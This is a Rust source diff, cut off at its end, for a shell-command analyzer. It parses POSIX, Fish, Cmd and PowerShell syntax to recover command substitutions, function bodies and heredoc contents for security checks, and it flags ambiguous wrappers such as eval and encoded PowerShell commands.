+const MAX_SHELL_DELIMITER_DEPTH: usize = 64;
+
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum ShellLexQuote {
+    Normal,
+    Single,
+    Double,
+}
+
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum ShellDelimiter {
+    Paren,
+    Brace,
+}
+
+impl ShellDelimiter {
+    fn from_open(byte: u8) -> Option<Self> {
+        match byte {
+            b'(' => Some(Self::Paren),
+            b'{' => Some(Self::Brace),
+            _ => None,
+        }
+    }
+
+    fn close(self) -> u8 {
+        match self {
+            Self::Paren => b')',
+            Self::Brace => b'}',
+        }
+    }
+}
+
+fn shell_escape_byte(shell: ShellType) -> u8 {
+    match shell {
+        ShellType::PowerShell => b'`',
+        ShellType::Cmd => b'^',
+        ShellType::Posix | ShellType::Fish => b'\\',
+    }
+}
+
+fn posix_reserved_word_right_boundary(byte: Option<&u8>) -> bool {
+    byte.is_none_or(|byte| {
+        matches!(
+            byte,
+            b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b'(' | b')'
+        )
+    })
+}
+
+fn starts_shell_line_comment(
+    bytes: &[u8],
+    i: usize,
+    shell: ShellType,
+    at_word_start: bool,
+) -> bool {
+    if bytes.get(i) != Some(&b'#') {
+        return false;
+    }
+    match shell {
+        ShellType::Cmd => false,
+        ShellType::PowerShell | ShellType::Posix | ShellType::Fish => at_word_start,
+    }
+}
+
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum PowerShellLexTokenClass {
+    Start,
+    Generic,
+    QuoteOnly,
+}
+
+impl PowerShellLexTokenClass {
+    fn starts_special_token(self) -> bool {
+        !matches!(self, Self::Generic)
+    }
+}
+
+fn powershell_stop_parsing_at(
+    raw: &str,
+    index: usize,
+    token_class: PowerShellLexTokenClass,
+) -> bool {
+    token_class.starts_special_token()
+        && raw
+            .get(index..)
+            .is_some_and(|suffix| suffix.starts_with("--%"))
+        && raw
+            .get(index + 3..)
+            .and_then(|suffix| suffix.chars().next())
+            .is_none_or(|next| {
+                next.is_whitespace()
+                    || matches!(next, '&' | '(' | ')' | ',' | ';' | '{' | '|' | '}')
+            })
+}
+
+fn skip_powershell_stop_parsing(raw: &str, mut index: usize) -> usize {
+    let mut in_double_quotes = false;
+    while let Some(ch) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
+        if matches!(ch, '\r' | '\n')
+            || (!in_double_quotes
+                && (ch == '|'
+                    || (ch == '&'
+                        && raw
+                            .get(index + ch.len_utf8()..)
+                            .and_then(|suffix| suffix.chars().next())
+                            == Some('&'))))
+        {
+            break;
+        }
+        if tokenize::powershell_quote_kind(ch) == Some(tokenize::PowerShellQuoteKind::Double) {
+            in_double_quotes = !in_double_quotes;
+        }
+        index += ch.len_utf8();
+    }
+    index
+}
+
+fn find_powershell_delimiter_close(input: &str, open: usize) -> Option<usize> {
+    let initial = ShellDelimiter::from_open(*input.as_bytes().get(open)?)?;
+    let mut frames = vec![(initial, None::<(PowerShellFunctionQuote, bool)>)];
+    let mut quote = None::<(PowerShellFunctionQuote, bool)>;
+    let mut token_class = PowerShellLexTokenClass::Start;
+    let mut in_line_comment = false;
+    let mut index = open + 1;
+
+    while let Some(ch) = input.get(index..).and_then(|suffix| suffix.chars().next()) {
+        if in_line_comment {
+            index += ch.len_utf8();
+            if matches!(ch, '\r' | '\n') {
+                in_line_comment = false;
+                token_class = PowerShellLexTokenClass::Start;
+            }
+            continue;
+        }
+
+        if let Some((kind, started_generic)) = quote {
+            if kind == PowerShellFunctionQuote::Double && ch == '`' {
+                index += ch.len_utf8();
+                if let Some(escaped) = input.get(index..).and_then(|suffix| suffix.chars().next()) {
+                    index += escaped.len_utf8();
+                }
+                continue;
+            }
+            if kind == PowerShellFunctionQuote::Double
+                && ch == '$'
+                && matches!(input.as_bytes().get(index + 1), Some(b'(' | b'{'))
+            {
+                if frames.len() >= MAX_SHELL_DELIMITER_DEPTH {
+                    return None;
+                }
+                let nested = ShellDelimiter::from_open(*input.as_bytes().get(index + 1)?)?;
+                frames.push((nested, quote));
+                quote = None;
+                token_class = PowerShellLexTokenClass::Start;
+                index += 2;
+                continue;
+            }
+            if powershell_function_quote(ch) == Some(kind) {
+                let next = index + ch.len_utf8();
+                if kind == PowerShellFunctionQuote::Single
+                    && input
+                        .get(next..)
+                        .and_then(|suffix| suffix.chars().next())
+                        .and_then(powershell_function_quote)
+                        == Some(kind)
+                {
+                    index = next
+                        + input
+                            .get(next..)
+                            .and_then(|suffix| suffix.chars().next())?
+                            .len_utf8();
+                    continue;
+                }
+                quote = None;
+                token_class = if started_generic {
+                    PowerShellLexTokenClass::Generic
+                } else {
+                    PowerShellLexTokenClass::QuoteOnly
+                };
+            }
+            index += ch.len_utf8();
+            continue;
+        }
+
+        if input
+            .get(index..)
+            .is_some_and(|suffix| suffix.starts_with("<#"))
+            && token_class.starts_special_token()
+        {
+            index = powershell_block_comment_end_bytes(input, index)?;
+            token_class = PowerShellLexTokenClass::Start;
+            continue;
+        }
+        if ch == '#' && token_class.starts_special_token() {
+            in_line_comment = true;
+            index += ch.len_utf8();
+            continue;
+        }
+        if ch == '@'
+            && token_class.starts_special_token()
+            && input
+                .get(index + 1..)
+                .and_then(|suffix| suffix.chars().next())
+                .and_then(tokenize::powershell_quote_kind)
+                .is_some()
+        {
+            index = tokenize::powershell_here_string(input, index)?.end;
+            token_class = PowerShellLexTokenClass::QuoteOnly;
+            continue;
+        }
+        if powershell_stop_parsing_at(input, index, token_class) {
+            index = skip_powershell_stop_parsing(input, index);
+            token_class = PowerShellLexTokenClass::Generic;
+            continue;
+        }
+        if ch == '`' {
+            index += ch.len_utf8();
+            let Some(escaped) = input.get(index..).and_then(|suffix| suffix.chars().next()) else {
+                return None;
+            };
+            if escaped != '\n' && escaped != '\r' {
+                token_class = PowerShellLexTokenClass::Generic;
+            }
+            index += escaped.len_utf8();
+            if escaped == '\r' && input.as_bytes().get(index) == Some(&b'\n') {
+                index += 1;
+            }
+            continue;
+        }
+        if let Some(kind) = powershell_function_quote(ch) {
+            let started_generic = token_class == PowerShellLexTokenClass::Generic;
+            quote = Some((kind, started_generic));
+            index += ch.len_utf8();
+            continue;
+        }
+        if let Some(nested) = ch
+            .is_ascii()
+            .then(|| ShellDelimiter::from_open(ch as u8))
+            .flatten()
+        {
+            if frames.len() >= MAX_SHELL_DELIMITER_DEPTH {
+                return None;
+            }
+            frames.push((nested, None));
+            token_class = PowerShellLexTokenClass::Start;
+            index += ch.len_utf8();
+            continue;
+        }
+        if ch.is_ascii()
+            && frames
+                .last()
+                .is_some_and(|(delimiter, _)| delimiter.close() == ch as u8)
+        {
+            let (_, restore_quote) = frames.pop()?;
+            if frames.is_empty() {
+                return Some(index);
+            }
+            quote = restore_quote;
+            token_class = if quote.is_some() {
+                PowerShellLexTokenClass::Generic
+            } else {
+                PowerShellLexTokenClass::Start
+            };
+            index += ch.len_utf8();
+            continue;
+        }
+        token_class = match ch {
+            ch if ch.is_whitespace() => PowerShellLexTokenClass::Start,
+            ',' | ';' | '&' | '|' | '=' | '(' | ')' | '{' | '}' => PowerShellLexTokenClass::Start,
+            '<' | '>' if token_class.starts_special_token() => PowerShellLexTokenClass::Start,
+            _ => PowerShellLexTokenClass::Generic,
+        };
+        index += ch.len_utf8();
+    }
+    None
+}
+
+fn find_backtick_close(input: &str, open: usize) -> Option<usize> {
+    let bytes = input.as_bytes();
+    let mut i = open + 1;
+    while i < bytes.len() {
+        if bytes[i] == b'\\' && i + 1 < bytes.len() {
+            i += 2;
+        } else if bytes[i] == b'`' {
+            return Some(i);
+        } else {
+            i += 1;
+        }
+    }
+    None
+}
+
+/// Find the close for a shell compound delimiter without letting quotes,
+/// escapes, comments, or a nested expansion terminate its parent. Delimiter
+/// frames carry the quote state to restore, so `$()` nested inside a
+/// double-quoted word is parsed with its own shell quote context.
+fn find_shell_delimiter_close(input: &str, open: usize, shell: ShellType) -> Option<usize> {
+    if shell == ShellType::PowerShell {
+        return find_powershell_delimiter_close(input, open);
+    }
+    let bytes = input.as_bytes();
+    let initial = ShellDelimiter::from_open(*bytes.get(open)?)?;
+    let mut frames = vec![(initial, ShellLexQuote::Normal)];
+    let mut quote = ShellLexQuote::Normal;
+    let mut in_comment = false;
+    let mut word_start = true;
+    let mut i = open + 1;
+
+    while i < bytes.len() {
+        let byte = bytes[i];
+        if in_comment {
+            if byte == b'\n' {
+                in_comment = false;
+                word_start = true;
+            }
+            i += 1;
+            continue;
+        }
+
+        match quote {
+            ShellLexQuote::Single => {
+                if byte == b'\'' {
+                    if shell == ShellType::PowerShell && bytes.get(i + 1) == Some(&b'\'') {
+                        i += 2;
+                        continue;
+                    }
+                    quote = ShellLexQuote::Normal;
+                }
+                i += 1;
+                continue;
+            }
+            ShellLexQuote::Double => {
+                if byte == shell_escape_byte(shell) && i + 1 < bytes.len() {
+                    i += 2;
+                    continue;
+                }
+                if byte == b'"' {
+                    quote = ShellLexQuote::Normal;
+                    i += 1;
+                    continue;
+                }
+                if shell != ShellType::Cmd
+                    && byte == b'$'
+                    && matches!(bytes.get(i + 1).copied(), Some(b'(' | b'{'))
+                {
+                    if frames.len() >= MAX_SHELL_DELIMITER_DEPTH {
+                        return None;
+                    }
+                    let nested = ShellDelimiter::from_open(bytes[i + 1])?;
+                    frames.push((nested, ShellLexQuote::Double));
+                    quote = ShellLexQuote::Normal;
+                    i += 2;
+                    continue;
+                }
+                if shell == ShellType::Posix && byte == b'`' {
+                    i = find_backtick_close(input, i)? + 1;
+                    continue;
+                }
+                i += 1;
+                continue;
+            }
+            ShellLexQuote::Normal => {}
+        }
+
+        if starts_shell_line_comment(bytes, i, shell, word_start) {
+            in_comment = true;
+            i += 1;
+            continue;
+        }
+        if byte == shell_escape_byte(shell) && i + 1 < bytes.len() {
+            if matches!(shell, ShellType::Posix | ShellType::Fish)
+                && bytes.get(i + 1) == Some(&b'\n')
+            {
+                i += 2;
+                continue;
+            }
+            word_start = false;
+            i += 2;
+            continue;
+        }
+        if byte == b'\'' && shell != ShellType::Cmd {
+            word_start = false;
+            quote = ShellLexQuote::Single;
+            i += 1;
+            continue;
+        }
+        if byte == b'"' {
+            word_start = false;
+            quote = ShellLexQuote::Double;
+            i += 1;
+            continue;
+        }
+        if let Some(nested) = ShellDelimiter::from_open(byte) {
+            if shell == ShellType::Posix
+                && nested == ShellDelimiter::Brace
+                && !(bytes.get(i.wrapping_sub(1)) == Some(&b'$')
+                    || (word_start && posix_reserved_word_right_boundary(bytes.get(i + 1))))
+            {
+                word_start = false;
+                i += 1;
+                continue;
+            }
+            if frames.len() >= MAX_SHELL_DELIMITER_DEPTH {
+                return None;
+            }
+            frames.push((nested, ShellLexQuote::Normal));
+            word_start = true;
+            i += 1;
+            continue;
+        }
+        if frames.last().is_some_and(|(delimiter, _)| {
+            delimiter.close() == byte
+                && !(shell == ShellType::Posix
+                    && *delimiter == ShellDelimiter::Brace
+                    && !(word_start && posix_reserved_word_right_boundary(bytes.get(i + 1))))
+        }) {
+            let (_, restore_quote) = frames.pop()?;
+            if frames.is_empty() {
+                return Some(i);
+            }
+            quote = restore_quote;
+            word_start = false;
+        }
+        if matches!(shell, ShellType::Posix | ShellType::Fish) {
+            if matches!(byte, b' ' | b'\t' | b'\n' | b';' | b'&' | b'|') {
+                word_start = true;
+            } else if !matches!(byte, b'(' | b')') {
+                word_start = false;
+            }
+        } else if shell == ShellType::PowerShell {
+            if byte.is_ascii_whitespace() || matches!(byte, b';' | b'&' | b'|') {
+                word_start = true;
+            } else if !matches!(byte, b'(' | b')') {
+                word_start = false;
+            }
+        }
+        i += 1;
+    }
+    None
+}
+
+fn find_substitution_close(input: &str, open: usize, shell: ShellType) -> Option<usize> {
+    if input.as_bytes().get(open) != Some(&b'(') {
+        return None;
+    }
+    find_shell_delimiter_close(input, open, shell)
+}
+
+fn capture_shell_body(
+    raw: &str,
+    open: usize,
+    shell: ShellType,
+    bodies: &mut Vec<String>,
+) -> Option<usize> {
+    let close = if raw.as_bytes().get(open) == Some(&b'(') {
+        find_substitution_close(raw, open, shell)
+    } else {
+        find_shell_delimiter_close(raw, open, shell)
+    };
+    if let Some(close) = close {
+        if let Some(body) = raw.get(open + 1..close) {
+            bodies.push(body.to_string());
+        }
+        return Some(close + 1);
+    }
+
+    // An unterminated active construct must not create an inert carveout or
+    // silently hide its suffix. Conservatively analyze everything after the
+    // opener; source/command/blast-radius consumers can then fail closed on the
+    // potentially executable content that was recoverable.
+    if let Some(suffix) = raw.get(open + 1..) {
+        if !suffix.trim().is_empty() {
+            bodies.push(suffix.to_string());
+        }
+    }
+    None
+}
+
+#[derive(Clone)]
+struct PosixFunctionDefinition {
+    name: String,
+    body: String,
+}
+
+#[derive(Clone)]
+struct PosixFunctionBinding {
+    definition: PosixFunctionDefinition,
+    readonly: bool,
+}
+
+enum PosixFunctionParse {
+    NotDefinition,
+    Complete {
+        definition: PosixFunctionDefinition,
+        end: usize,
+    },
+    Incomplete {
+        body_start: usize,
+    },
+}
+
+fn parse_ascii_shell_name(raw: &str, start: usize) -> Option<(String, usize)> {
+    let bytes = raw.as_bytes();
+    let first = *bytes.get(start)?;
+    if first != b'_' && !first.is_ascii_alphabetic() {
+        return None;
+    }
+    let mut end = start + 1;
+    while bytes
+        .get(end)
+        .is_some_and(|byte| *byte == b'_' || byte.is_ascii_alphanumeric())
+    {
+        end += 1;
+    }
+    Some((raw.get(start..end)?.to_string(), end))
+}
+
+fn posix_shell_word_end(raw: &str, start: usize) -> Option<usize> {
+    let bytes = raw.as_bytes();
+    let mut quote = ShellLexQuote::Normal;
+    let mut index = start;
+    while let Some(byte) = bytes.get(index).copied() {
+        match quote {
+            ShellLexQuote::Single => {
+                if byte == b'\'' {
+                    quote = ShellLexQuote::Normal;
+                }
+                index += 1;
+            }
+            ShellLexQuote::Double => {
+                if byte == b'"' {
+                    quote = ShellLexQuote::Normal;
+                    index += 1;
+                } else if byte == b'\\' {
+                    bytes.get(index + 1)?;
+                    index += 2;
+                } else {
+                    index += 1;
+                }
+            }
+            ShellLexQuote::Normal => {
+                if matches!(byte, b' ' | b'\t' | b'\n') || b";&|<>(){}".contains(&byte) {
+                    break;
+                }
+                match byte {
+                    b'\'' => {
+                        quote = ShellLexQuote::Single;
+                        index += 1;
+                    }
+                    b'"' => {
+                        quote = ShellLexQuote::Double;
+                        index += 1;
+                    }
+                    b'\\' => {
+                        bytes.get(index + 1)?;
+                        index += 2;
+                    }
+                    _ => index += 1,
+                }
+            }
+        }
+    }
+    (quote == ShellLexQuote::Normal && index != start).then_some(index)
+}
+
+fn parse_static_posix_shell_word(raw: &str, start: usize) -> Option<(String, usize)> {
+    let index = posix_shell_word_end(raw, start)?;
+    let spelling = raw.get(start..index)?;
+    crate::rules::command::command_word_is_statically_bound(spelling, ShellType::Posix)
+        .then(|| {
+            (
+                crate::rules::command::normalize_shell_token(spelling, ShellType::Posix),
+                index,
+            )
+        })
+        .filter(|(word, _)| !word.is_empty())
+}
+
+fn is_literal_bash_function_name(name: &str, allow_equal: bool) -> bool {
+    !name.is_empty()
+        && name.chars().all(|ch| {
+            !matches!(
+                ch,
+                '\0' | ' '
+                    | '\t'
+                    | '\n'
+                    | '$'
+                    | '\''
+                    | '"'
+                    | '\\'
+                    | ';'
+                    | '&'
+                    | '|'
+                    | '<'
+                    | '>'
+                    | '('
+                    | ')'
+            ) && (allow_equal || ch != '=')
+        })
+}
+
+fn bash_function_name_end(raw: &str, start: usize) -> Option<usize> {
+    let bytes = raw.as_bytes();
+    let mut end = start;
+    while let Some(byte) = bytes.get(end) {
+        if *byte == b'\\' && bytes.get(end + 1) == Some(&b'\n') {
+            end += 2;
+            continue;
+        }
+        if matches!(byte, b' ' | b'\t' | b'\n') || b";&|<>()".contains(byte) {
+            break;
+        }
+        end += 1;
+    }
+    (end != start).then_some(end)
+}
+
+fn splice_posix_line_continuations(raw: &str) -> String {
+    raw.replace("\\\n", "")
+}
+
+fn is_strict_posix_reserved_word(raw: &str, expected: &str) -> bool {
+    let bytes = raw.as_bytes();
+    let mut normalized = Vec::with_capacity(bytes.len());
+    let mut index = 0usize;
+    while index < bytes.len() {
+        if bytes.get(index..index + 2) == Some(b"\\\n") {
+            index += 2;
+            continue;
+        }
+        normalized.push(bytes[index]);
+        index += 1;
+    }
+    normalized == expected.as_bytes()
+}
+
+fn parse_literal_bash_function_name(
+    raw: &str,
+    start: usize,
+    allow_equal: bool,
+) -> Option<(String, usize)> {
+    let end = bash_function_name_end(raw, start)?;
+    let spelling = raw.get(start..end)?;
+    let normalized = crate::rules::command::normalize_shell_token(spelling, ShellType::Posix);
+    (splice_posix_line_continuations(spelling) == normalized
+        && is_literal_bash_function_name(&normalized, allow_equal))
+    .then_some((normalized, end))
+}
+
+fn skip_posix_trivia(raw: &str, mut i: usize) -> usize {
+    let bytes = raw.as_bytes();
+    loop {
+        while bytes
+            .get(i)
+            .is_some_and(|byte| matches!(byte, b' ' | b'\t' | b'\n'))
+        {
+            i += 1;
+        }
+        if starts_shell_line_comment(bytes, i, ShellType::Posix, true) {
+            while bytes.get(i).is_some_and(|byte| *byte != b'\n') {
+                i += 1;
+            }
+            continue;
+        }
+        return i;
+    }
+}
+
+fn skip_posix_horizontal_whitespace(raw: &str, mut i: usize) -> usize {
+    let bytes = raw.as_bytes();
+    while bytes
+        .get(i)
+        .is_some_and(|byte| matches!(byte, b' ' | b'\t'))
+    {
+        i += 1;
+    }
+    i
+}
+
+fn parse_posix_function_definition(raw: &str, start: usize) -> PosixFunctionParse {
+    let bytes = raw.as_bytes();
+    let Some(first_end) = posix_shell_word_end(raw, start) else {
+        return PosixFunctionParse::NotDefinition;
+    };
+    let Some(first_spelling) = raw.get(start..first_end) else {
+        return PosixFunctionParse::NotDefinition;
+    };
+
+    let name;
+    let mut i;
+    if is_strict_posix_reserved_word(first_spelling, "function") {
+        i = skip_posix_horizontal_whitespace(raw, first_end);
+        let name_start = i;
+        let Some((parsed_name, after_name)) = parse_literal_bash_function_name(raw, i, true) else {
+            return PosixFunctionParse::NotDefinition;
+        };
+        if raw
+            .get(name_start..after_name)
+            .map(splice_posix_line_continuations)
+            .as_deref()
+            != Some(parsed_name.as_str())
+        {
+            return PosixFunctionParse::NotDefinition;
+        }
+        name = parsed_name;
+        i = skip_posix_horizontal_whitespace(raw, after_name);
+        if bytes.get(i) == Some(&b'(') {
+            let after_open = skip_posix_horizontal_whitespace(raw, i + 1);
+            if bytes.get(after_open) == Some(&b')') {
+                i = after_open + 1;
+            }
+        }
+    } else {
+        let Some((parsed_name, after_name)) = parse_literal_bash_function_name(raw, start, true)
+        else {
+            return PosixFunctionParse::NotDefinition;
+        };
+        if tokenize::is_env_assignment(&parsed_name) {
+            return PosixFunctionParse::NotDefinition;
+        }
+        name = parsed_name;
+        i = skip_posix_horizontal_whitespace(raw, after_name);
+        if bytes.get(i) != Some(&b'(') {
+            return PosixFunctionParse::NotDefinition;
+        }
+        i = skip_posix_horizontal_whitespace(raw, i + 1);
+        if bytes.get(i) != Some(&b')') {
+            return PosixFunctionParse::NotDefinition;
+        }
+        i += 1;
+    }
+
+    i = skip_posix_trivia(raw, i);
+    if !matches!(bytes.get(i).copied(), Some(b'{' | b'(')) {
+        return PosixFunctionParse::Incomplete { body_start: i };
+    }
+    let body_start = i + 1;
+    let Some(close) = find_shell_delimiter_close(raw, i, ShellType::Posix) else {
+        return PosixFunctionParse::Incomplete { body_start };
+    };
+    let Some(body) = raw.get(body_start..close) else {
+        return PosixFunctionParse::Incomplete { body_start };
+    };
+    PosixFunctionParse::Complete {
+        definition: PosixFunctionDefinition {
+            name,
+            body: body.to_string(),
+        },
+        end: close + 1,
+    }
+}
+
+fn posix_assignment_word_at(raw: &str, start: usize) -> bool {
+    let Some((_, end)) = parse_ascii_shell_name(raw, start) else {
+        return false;
+    };
+    raw.as_bytes().get(end) == Some(&b'=')
+}
+
+fn shell_word_boundary(byte: Option<&u8>) -> bool {
+    byte.is_none_or(|byte| matches!(byte, b' ' | b'\t' | b'\n') || b";&|<>(){}".contains(byte))
+}
+
+fn posix_command_prefix(raw_word: &str, word: &str) -> bool {
+    matches!(
+        word,
+        "if" | "then" | "elif" | "else" | "while" | "until" | "do" | "!"
+    ) && is_strict_posix_reserved_word(raw_word, word)
+}
+
+/// Recover command/process substitutions, executable groups, and invoked
+/// POSIX function bodies. The scanner is intentionally bounded and lexical: it
+/// tracks shell-correct quote/comment state and nested delimiters, skips dormant
+/// function definitions, and conservatively returns recoverable suffixes for
+/// incomplete active constructs.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum ShellExecutionGap {
+    /// PowerShell's call/dot operator will execute a value whose command or
+    /// script-block identity cannot be proved from the source text.
+    AmbiguousPowerShellInvocation,
+    /// A PowerShell invocation group/expression opened but could not be closed
+    /// within the lexical delimiter budget.
+    IncompletePowerShellInvocation,
+    /// A shell/interpreter wrapper (`sh -c`, `pwsh -Command`, `cmd /C`,
+    /// `eval`, or `Invoke-Expression`) will execute a value that is not a
+    /// statically visible literal command body.
+    AmbiguousExecutableBody,
+    /// A PowerShell `-EncodedCommand` operand was present but could not be
+    /// decoded as bounded base64-encoded UTF-16LE source.
+    InvalidEncodedPowerShellCommand,
+    /// An active POSIX/Fish/Cmd group or substitution was opened but could not
+    /// be closed within the bounded lexical parser.
+    IncompleteExecutableBody,
+}
+
+/// A statically recovered command body together with the shell that will parse
+/// it. Carrying the child shell is load-bearing for cross-shell wrappers such
+/// as `sh -c 'pwsh -Command ...'`: parsing every body as the outer shell would
+/// silently skip shell-specific controls.
+#[derive(Debug)]
+pub(crate) struct ExecutableBody {
+    pub input: String,
+    pub shell: ShellType,
+}
+
+#[derive(Debug, Default)]
+pub(crate) struct ExecutableSubstitutionScan {
+    pub bodies: Vec<ExecutableBody>,
+    pub gap: Option<ShellExecutionGap>,
+}
+
+const MAX_HEREDOCS: usize = 32;
+const MAX_HEREDOC_DELIMITER_BYTES: usize = 256;
+const MAX_HEREDOC_BODY_BYTES: usize = 256 * 1024;
+
+#[derive(Debug)]
+struct PosixHeredocSpec {
+    delimiter: String,
+    quoted: bool,
+    strip_tabs: bool,
+    operator_range: std::ops::Range<usize>,
+    stdin: bool,
+}
+
+#[derive(Debug, Default)]
+struct PosixHeredocRecovery {
+    sanitized: String,
+    bodies: Vec<ExecutableBody>,
+    gap: Option<ShellExecutionGap>,
+}
+
+fn parse_posix_heredoc_delimiter(line: &str, operator: usize) -> Result<(String, bool, usize), ()> {
+    let bytes = line.as_bytes();
+    let mut index = operator + 2;
+    if bytes.get(index) == Some(&b'-') {
+        index += 1;
+    }
+    while bytes
+        .get(index)
+        .is_some_and(|byte| matches!(byte, b' ' | b'\t'))
+    {
+        index += 1;
+    }
+    if index >= bytes.len() || bytes.get(index) == Some(&b'#') {
+        return Err(());
+    }
+
+    let mut delimiter = Vec::new();
+    let mut quote = None;
+    let mut quoted = false;
+    while let Some(&byte) = bytes.get(index) {
+        if let Some(active) = quote {
+            if byte == active {
+                quote = None;
+                quoted = true;
+                index += 1;
+            } else if active == b'"' && byte == b'\\' {
+                let escaped = *bytes.get(index + 1).ok_or(())?;
+                delimiter.push(escaped);
+                quoted = true;
+                index += 2;
+            } else {
+                delimiter.push(byte);
+                index += 1;
+            }
+            continue;
+        }
+        if matches!(byte, b'\'' | b'"') {
+            quote = Some(byte);
+            quoted = true;
+            index += 1;
+        } else if byte == b'\\' {
+            delimiter.push(*bytes.get(index + 1).ok_or(())?);
+            quoted = true;
+            index += 2;
+        } else if byte.is_ascii_whitespace() || b";&|<>()".contains(&byte) {
+            break;
+        } else {
+            delimiter.push(byte);
+            index += 1;
+        }
+        if delimiter.len() > MAX_HEREDOC_DELIMITER_BYTES {
+            return Err(());
+        }
+    }
+    if quote.is_some() {
+        return Err(());
+    }
+    let delimiter = String::from_utf8(delimiter).map_err(|_| ())?;
+    Ok((delimiter, quoted, index))
+}
+
+fn posix_heredoc_specs(
+    line: &str,
+    initial_quote: ShellLexQuote,
+) -> (Vec<PosixHeredocSpec>, bool, ShellLexQuote) {
+    let bytes = line.as_bytes();
+    let mut specs = Vec::new();
+    let mut quote = initial_quote;
+    let mut unsupported = false;
+    let mut index = 0usize;
+    let mut word_start = true;
+    while index < bytes.len() {
+        let byte = bytes[index];
+        match quote {
+            ShellLexQuote::Single => {
+                if byte == b'\'' {
+                    quote = ShellLexQuote::Normal;
+                }
+                index += 1;
+                continue;
+            }
+            ShellLexQuote::Double => {
+                if byte == b'\\' && index + 1 < bytes.len() {
+                    index += 2;
+                    continue;
+                }
+                if byte == b'"' {
+                    quote = ShellLexQuote::Normal;
+                }
+                index += 1;
+                continue;
+            }
+            ShellLexQuote::Normal => {}
+        }
+        if starts_shell_line_comment(bytes, index, ShellType::Posix, word_start) {
+            break;
+        }
+        if byte == b'\\' && index + 1 < bytes.len() {
+            word_start = false;
+            index += 2;
+            continue;
+        }
+        if byte == b'\'' {
+            word_start = false;
+            quote = ShellLexQuote::Single;
+            index += 1;
+            continue;
+        }
+        if byte == b'"' {
+            word_start = false;
+            quote = ShellLexQuote::Double;
+            index += 1;
+            continue;
+        }
+        if bytes.get(index..index + 3) == Some(b"$((") {
+            if let Some(close) = find_shell_delimiter_close(line, index + 1, ShellType::Posix) {
+                index = close + 1;
+                word_start = false;
+                continue;
+            }
+        }
+        if bytes.get(index..index + 3) == Some(b"<<<") {
+            // Here-strings have a different expansion grammar and no delimiter
+            // line. Keep them explicitly unsupported rather than confusing the
+            // operand with a heredoc delimiter.
+            unsupported = true;
+            index += 3;
+            word_start = false;
+            continue;
+        }
+        if bytes.get(index..index + 2) != Some(b"<<") {
+            if matches!(byte, b' ' | b'\t' | b';' | b'&' | b'|') {
+                word_start = true;
+            } else {
+                word_start = false;
+            }
+            index += 1;
+            continue;
+        }
+
+        let operator = index;
+        match parse_posix_heredoc_delimiter(line, operator) {
+            Ok((delimiter, quoted, end)) => {
+                let strip_tabs = bytes.get(operator + 2) == Some(&b'-');
+                let digit_start = line[..operator]
+                    .rfind(|character: char| !character.is_ascii_digit())
+                    .map_or(0, |offset| offset + 1);
+                let fd = line
+                    .get(digit_start..operator)
+                    .filter(|raw| !raw.is_empty());
+                specs.push(PosixHeredocSpec {
+                    delimiter,
+                    quoted,
+                    strip_tabs,
+                    operator_range: digit_start..end,
+                    stdin: fd.is_none_or(|raw| raw == "0"),
+                });
+                index = end;
+                word_start = false;
+            }
+            Err(()) => {
+                unsupported = true;
+                index += 2;
+            }
+        }
+    }
+    // A quote can legitimately span physical lines. The caller carries this
+    // state so `<<EOF` text on a later quoted line cannot be invented as a
+    // heredoc operator. If a real heredoc header itself leaves a quote open,
+    // its body boundary is ambiguous and must remain fail-closed.
+    let quote_ambiguous_for_heredoc = !specs.is_empty() && quote != ShellLexQuote::Normal;
+    (specs, unsupported || quote_ambiguous_for_heredoc, quote)
+}
+
+fn mask_non_newline(bytes: &mut [u8], range: std::ops::Range<usize>) {
+    for byte in bytes.get_mut(range).into_iter().flatten() {
+        if !matches!(*byte, b'\n' | b'\r') {
+            *byte = b' ';
+        }
+    }
+}
+
+fn strip_heredoc_tabs(body: &str) -> String {
+    let mut result = String::with_capacity(body.len());
+    for line in body.split_inclusive('\n') {
+        result.push_str(line.trim_start_matches('\t'));
+    }
+    result
+}
+
+fn unescape_unquoted_heredoc(body: &str) -> String {
+    let bytes = body.as_bytes();
+    let mut output = Vec::with_capacity(bytes.len());
+    let mut index = 0usize;
+    while index < bytes.len() {
+        if bytes[index] == b'\\' {
+            match bytes.get(index + 1).copied() {
+                Some(next @ (b'\\' | b'$' | b'`')) => {
+                    output.push(next);
+                    index += 2;
+                    continue;
+                }
+                Some(b'\n') => {
+                    index += 2;
+                    continue;
+                }
+                _ => {}
+            }
+        }
+        output.push(bytes[index]);
+        index += 1;
+    }
+    String::from_utf8(output).unwrap_or_else(|_| body.to_string())
+}
+
+fn scan_unquoted_heredoc_expansions(body: &str, scan: &mut PosixHeredocRecovery) {
+    let bytes = body.as_bytes();
+    let mut index = 0usize;
+    while index < bytes.len() {
+        if bytes[index] == b'\\' {
+            index += if index + 1 < bytes.len() { 2 } else { 1 };
+            continue;
+        }
+        if bytes.get(index..index + 2) == Some(b"$(") && bytes.get(index..index + 3) != Some(b"$((")
+        {
+            let mut recovered = Vec::new();
+            match capture_shell_body(body, index + 1, ShellType::Posix, &mut recovered) {
+                Some(next) => {
+                    scan.bodies
+                        .extend(recovered.into_iter().map(|input| ExecutableBody {
+                            input,
+                            shell: ShellType::Posix,
+                        }));
+                    index = next;
+                }
+                None => {
+                    scan.gap = Some(ShellExecutionGap::IncompleteExecutableBody);
+                    break;
+                }
+            }
+            continue;
+        }
+        if bytes[index] == b'`' {
+            let Some(close) = find_backtick_close(body, index) else {
+                scan.gap = Some(ShellExecutionGap::IncompleteExecutableBody);
+                break;
+            };
+            if let Some(input) = body
+                .get(index + 1..close)
+                .filter(|input| !input.trim().is_empty())
+            {
+                scan.bodies.push(ExecutableBody {
+                    input: input.to_string(),
+                    shell: ShellType::Posix,
+                });
+            }
+            index = close + 1;
+            continue;
+        }
+        index += 1;
+    }
+}
+
+fn shell_reads_heredoc_from_stdin(command: &str, args: &[String]) -> Option<ShellType> {
+    let child_shell = match command {
+        "sh" | "bash" | "zsh" | "dash" | "ksh" | "csh" | "tcsh" | "ash" | "mksh" => {
+            ShellType::Posix
+        }
+        "fish" => ShellType::Fish,
+        _ => return None,
+    };
+    let mut force_stdin = false;
+    let mut index = 0usize;
+    while index < args.len() {
+        let option = static_wrapper_word(&args[index], ShellType::Posix)?;
+        if option == "--" {
+            return (force_stdin || index + 1 == args.len()).then_some(child_shell);
+        }
